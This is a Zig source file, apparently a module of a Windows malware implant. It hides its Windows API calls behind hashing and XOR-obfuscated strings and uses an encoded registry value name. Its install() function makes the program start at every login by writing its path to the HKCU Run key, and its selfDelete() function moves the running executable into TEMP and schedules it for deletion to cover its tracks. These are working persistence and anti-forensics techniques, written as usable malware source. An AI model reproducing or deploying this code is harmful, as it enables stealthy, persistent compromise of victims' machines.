const std = @import("std");
const ajuste = @import("ajuste.zig");
const furtivo = @import("furtivo.zig");
const obf = @import("obf.zig");

/// Owned NUL-terminated path of the running executable.
///
/// Uses GetModuleFileNameW rather than std.process.executablePathAlloc: the
/// latter requires a std.Io instance in Zig 0.16, and we already resolve
/// kernel32 dynamically everywhere else.
fn exePathAlloc(allocator: std.mem.Allocator) ![:0]u8 {
    const k32 = furtivo.getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    if (k32 == 0) return error.ModuleNotFound;

    const addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetModuleFileNameW")) catch 0;
    if (addr == 0) return error.ProcNotFound;

    const GetModuleFileNameWFn = *const fn (?*anyopaque, [*]u16, u32) callconv(.winapi) u32;
    const GetModuleFileNameW = @as(GetModuleFileNameWFn, @ptrFromInt(addr));

    var cap: usize = 260;
    while (cap <= 32768) : (cap *= 2) {
        const wbuf = try allocator.alloc(u16, cap);
        defer allocator.free(wbuf);

        const n = GetModuleFileNameW(null, wbuf.ptr, @intCast(cap));
        if (n == 0) return error.ModuleFileNameFailed;
        if (n < cap) {
            const utf8 = try std.unicode.utf16LeToUtf8Alloc(allocator, wbuf[0..n]);
            defer allocator.free(utf8);
            return allocator.dupeZ(u8, utf8);
        }
    }
    return error.PathTooLong;
}

pub fn install() !void {
    const allocator = std.heap.page_allocator;

    const exe_path_z = try exePathAlloc(allocator);
    defer allocator.free(exe_path_z);

    const value_name_str = try ajuste.decAlloc(allocator, "HF6863PSHcZ/PqlVGA==");
    defer allocator.free(value_name_str);
    const value_name_z = try allocator.dupeZ(u8, value_name_str);
    defer allocator.free(value_name_z);

    const advapi32 = furtivo.getModuleHandle(&comptime obf.xorStr("advapi32.dll"));
    if (advapi32 == 0) return error.ModuleNotFound;

    const RegOpenKeyExA_addr = obf.getProcAddressByHash(advapi32, comptime obf.apiHash("RegOpenKeyExA")) catch 0;
    const RegSetValueExA_addr = obf.getProcAddressByHash(advapi32, comptime obf.apiHash("RegSetValueExA")) catch 0;
    const RegCloseKey_addr = obf.getProcAddressByHash(advapi32, comptime obf.apiHash("RegCloseKey")) catch 0;
    if (RegOpenKeyExA_addr == 0 or RegSetValueExA_addr == 0 or RegCloseKey_addr == 0) return error.ProcNotFound;

    const RegOpenKeyExA = @as(*const fn (hKey: usize, lpSubKey: [*:0]const u8, ulOptions: u32, samDesired: u32, phkResult: *usize) callconv(.winapi) i32, @ptrFromInt(RegOpenKeyExA_addr));
    const RegSetValueExA = @as(*const fn (hKey: usize, lpValueName: [*:0]const u8, Reserved: u32, dwType: u32, lpData: [*]const u8, cbData: u32) callconv(.winapi) i32, @ptrFromInt(RegSetValueExA_addr));
    const RegCloseKey = @as(*const fn (hKey: usize) callconv(.winapi) i32, @ptrFromInt(RegCloseKey_addr));

    var hKey: usize = 0;
    const HKEY_CURRENT_USER: usize = 0x80000001;
    const subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, 0x20006, &hKey) == 0) {
        defer _ = RegCloseKey(hKey);
        // REG_SZ includes the NUL terminator in cbData.
        _ = RegSetValueExA(hKey, value_name_z.ptr, 0, 1, exe_path_z.ptr, @intCast(exe_path_z.len + 1));
    }
}

/// Move the running executable out of its original path, then register the
/// renamed copy for deletion at the next reboot.
///
/// Deleting a running image directly is not possible while it is mapped, so
/// the reliable primitive is `MoveFileExW(..., NULL, MOVEFILE_DELAY_UNTIL_REBOOT)`
/// on the renamed file. Best-effort: any failure is ignored.
pub fn selfDelete() !void {
    const allocator = std.heap.page_allocator;

    const exe_path_z = try exePathAlloc(allocator);
    defer allocator.free(exe_path_z);

    const exe_path_w = try std.unicode.utf8ToUtf16LeAllocZ(allocator, exe_path_z);
    defer allocator.free(exe_path_w);

    const k32 = furtivo.getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    if (k32 == 0) return error.ModuleNotFound;

    const MoveFileExW_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("MoveFileExW")) catch 0;
    const GetTickCount_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetTickCount")) catch 0;
    if (MoveFileExW_addr == 0 or GetTickCount_addr == 0) return error.ProcNotFound;

    const MoveFileExW = @as(*const fn (lpExistingFileName: [*:0]const u16, lpNewFileName: ?[*:0]const u16, dwFlags: u32) callconv(.winapi) i32, @ptrFromInt(MoveFileExW_addr));
    const GetTickCount = @as(*const fn () callconv(.winapi) u32, @ptrFromInt(GetTickCount_addr));

    const tick = GetTickCount();
    var temp_name_buf: [64]u8 = undefined;
    const temp_name = std.fmt.bufPrintZ(&temp_name_buf, "pipeta_{x}.tmp", .{tick}) catch return;

    const temp_dir = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp_dir);

    const temp_full = std.fmt.allocPrint(allocator, "{s}\\{s}", .{ temp_dir, temp_name }) catch return;
    defer allocator.free(temp_full);

    const temp_w = std.unicode.utf8ToUtf16LeAllocZ(allocator, temp_full) catch return;
    defer allocator.free(temp_w);

    const MOVEFILE_REPLACE_EXISTING: u32 = 0x00000001;
    const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x00000004;

    // Step 1: rename out of the original path (allowed while the image is mapped).
    if (MoveFileExW(exe_path_w, temp_w, MOVEFILE_REPLACE_EXISTING) == 0) return;

    // Step 2: schedule the renamed file for deletion on the next boot.
    _ = MoveFileExW(temp_w, null, MOVEFILE_DELAY_UNTIL_REBOOT);
}
